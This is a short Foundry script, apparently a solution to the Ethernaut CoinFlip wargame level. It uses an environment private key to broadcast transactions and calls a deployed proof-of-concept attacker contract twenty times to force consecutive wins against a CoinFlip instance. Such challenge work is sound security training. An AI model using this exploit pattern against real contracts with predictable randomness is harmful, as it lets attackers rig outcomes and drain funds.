// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "Ethernaut/coinflip_poc.sol";
import "forge-std/console.sol";

contract CoinFlipPOCScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        //console.log current network
        vm.startBroadcast(deployerPrivateKey);

        CoinFlipPOC coinFlipPOC = CoinFlipPOC(0xC7c7F8dc06d92eB770563e0689Bf9c1a5a7B5980);

        CoinFlip coinFlip = CoinFlip(0xbbbCEb62EFD3715016655237eBb5216Aad1d56c3);
        console.log("consecutiveWins: ", coinFlip.consecutiveWins());
        for (uint256 i = 0; i < 20; i++) {
            coinFlipPOC.flip();
        }

        vm.stopBroadcast();
    }
}